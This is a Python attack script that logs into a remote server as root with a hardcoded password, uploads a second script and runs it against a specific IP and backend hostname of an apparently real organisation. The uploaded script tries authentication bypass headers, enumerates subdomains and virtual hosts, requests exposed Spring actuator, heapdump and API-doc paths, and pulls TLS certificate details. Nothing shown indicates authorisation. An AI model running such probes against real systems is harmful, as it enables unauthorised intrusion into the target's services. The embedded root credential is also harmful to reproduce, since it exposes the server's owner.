import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)

SCRIPT = r'''
import requests, urllib3, json, sys
urllib3.disable_warnings()
IP = "35.238.21.37"
BFF = "bff-origination-service.orquesta.calidad-architect.com"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# 1. Grab full 401 response
sys.stdout.write("=== 401 BODY ===\n")
r = requests.get(f"https://{IP}/", headers={"Host": BFF, "User-Agent": UA}, timeout=5, verify=False)
sys.stdout.write(f"Status: {r.status_code}\n")
sys.stdout.write(f"Headers: {json.dumps(dict(r.headers), indent=2)}\n")
sys.stdout.write(f"Body: {r.text}\n\n")
sys.stdout.flush()

# 2. Try common auth bypasses
sys.stdout.write("=== AUTH BYPASS ATTEMPTS ===\n")
bypasses = [
    {"Authorization": "Bearer test"},
    {"Authorization": "Basic dGVzdDp0ZXN0"},
    {"X-Api-Key": "test"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/actuator/health"},
    {"X-Rewrite-URL": "/actuator/health"},
]
for bh in bypasses:
    try:
        h = {"Host": BFF, "User-Agent": UA}
        h.update(bh)
        r = requests.get(f"https://{IP}/", headers=h, timeout=5, verify=False, allow_redirects=False)
        key = list(bh.keys())[0]
        sys.stdout.write(f"  {key}={bh[key]}: [{r.status_code}] {len(r.text)}b\n")
        if r.status_code != 401:
            sys.stdout.write(f"    BODY: {r.text[:300]}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR: {e}\n")
    sys.stdout.flush()

# 3. Try different hosts on same IP
sys.stdout.write("\n=== WILDCARD HOSTS ===\n")
wild = [
    "anything.calidad-architect.com",
    "admin.calidad-architect.com",
    "gateway.calidad-architect.com",
    "keycloak.calidad-architect.com",
    "sso.calidad-architect.com",
    "auth.calidad-architect.com",
    "consul.calidad-architect.com",
    "config.calidad-architect.com",
    "spring-config.calidad-architect.com",
    "zipkin.calidad-architect.com",
    "grafana.calidad-architect.com",
    "kibana.calidad-architect.com",
    "jenkins.calidad-architect.com",
    "sonar.calidad-architect.com",
    "nexus.calidad-architect.com",
    "prometheus.calidad-architect.com",
]
for h in wild:
    try:
        r = requests.get(f"https://{IP}/", headers={"Host": h, "User-Agent": UA}, timeout=3, verify=False, allow_redirects=False)
        diff = "" if r.status_code == 401 and len(r.text) == 157 else f" *** DIFFERENT: {r.text[:200]} ***"
        sys.stdout.write(f"  {h}: [{r.status_code}] {len(r.text)}b{diff}\n")
    except Exception as e:
        sys.stdout.write(f"  {h}: ERR\n")
    sys.stdout.flush()

# 4. Try unauthenticated Spring paths
sys.stdout.write("\n=== SPRING PATHS ===\n")
paths = [
    "/actuator/health", "/actuator/info", "/actuator/env",
    "/actuator/mappings", "/actuator/beans", "/actuator/configprops",
    "/actuator/metrics", "/actuator/prometheus", "/actuator/loggers",
    "/actuator/threaddump", "/actuator/heapdump",
    "/v2/api-docs", "/v3/api-docs", "/swagger-ui.html", "/swagger-ui/index.html",
    "/manage/health", "/manage/env", "/admin/health",
    "/health", "/info", "/env",
    "/.well-known/openid-configuration",
    "/oauth/token", "/oauth2/token", "/auth/token",
    "/login", "/api/login", "/api/v1/login",
    "/error", "/favicon.ico",
]
for p in paths:
    try:
        r = requests.get(f"https://{IP}{p}", headers={"Host": BFF, "User-Agent": UA, "Accept": "application/json"}, timeout=3, verify=False, allow_redirects=False)
        diff = "" if r.status_code == 401 and len(r.text) == 157 else f" <<< {r.status_code} {len(r.text)}b"
        if diff:
            sys.stdout.write(f"  {p}: [{r.status_code}] {len(r.text)}b {r.text[:200]}\n")
        else:
            sys.stdout.write(f"  {p}: [401] 157b\n")
    except Exception as e:
        sys.stdout.write(f"  {p}: ERR\n")
    sys.stdout.flush()

# 5. SSL cert info
sys.stdout.write("\n=== SSL CERT ===\n")
import ssl, socket
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
with ctx.wrap_socket(socket.socket(), server_hostname=BFF) as s:
    s.settimeout(5)
    s.connect((IP, 443))
    cert = s.getpeercert(True)
    import hashlib
    sys.stdout.write(f"  SHA256: {hashlib.sha256(cert).hexdigest()}\n")
    cert_decoded = s.getpeercert()
    if cert_decoded:
        subj = dict(x[0] for x in cert_decoded.get("subject", []))
        issuer = dict(x[0] for x in cert_decoded.get("issuer", []))
        san = [v for _, v in cert_decoded.get("subjectAltName", [])]
        sys.stdout.write(f"  CN: {subj.get('commonName','?')}\n")
        sys.stdout.write(f"  Issuer: {issuer.get('organizationName','?')} / {issuer.get('commonName','?')}\n")
        sys.stdout.write(f"  SANs: {san[:20]}\n")
    else:
        sys.stdout.write("  No decoded cert (self-signed?)\n")
sys.stdout.flush()

sys.stdout.write("\nDONE\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/grab_401.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/grab_401.py 2>&1', timeout=180)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
